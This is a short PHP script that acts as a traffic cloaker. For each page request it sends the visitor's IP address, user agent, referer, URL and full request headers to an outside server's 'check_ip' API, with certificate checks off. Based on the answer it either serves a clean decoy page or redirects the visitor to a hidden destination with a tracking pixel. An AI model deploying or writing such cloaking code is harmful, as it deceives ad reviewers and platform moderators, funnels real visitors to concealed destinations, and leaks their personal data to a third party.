<?
$imklo_link = "http://emilyvegas.beget.tech";


$link = $_GET['link'];
$info = new SplFileInfo($link);
if($info->getExtension() == 'php' || $info->getExtension() == 'html' || $info->getExtension() == ''){
	$post['ip'] = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
	$post['domain'] = $_SERVER['HTTP_HOST'];
	$post['referer'] = @$_SERVER['HTTP_REFERER'];
	$post['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
	$post['url'] = $_SERVER['REQUEST_URI'];
	$post['headers'] = json_encode(apache_request_headers());
	$curl = curl_init($imklo_link.'/api/check_ip');
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_TIMEOUT, 60);
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
	$json_reqest = curl_exec($curl);
	curl_close($curl);
	$api_reqest = json_decode($json_reqest);
    
	if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
		require_once('w.php');
		exit();
	}else{		
		$blink = @$api_reqest->link.'?pixel='.$_GET['pixel'];
        header("Location: $blink");
		exit();
	}
}else{
	$type = 'text/'.$info->getExtension();
}

//header('Content-type: '.$type);
//$html = file_get_contents('https://'. $white_link . $link);
//$html = str_replace($white_link, $_SERVER['HTTP_HOST'], $html);
//echo str_replace('', "<html>", $html);
?>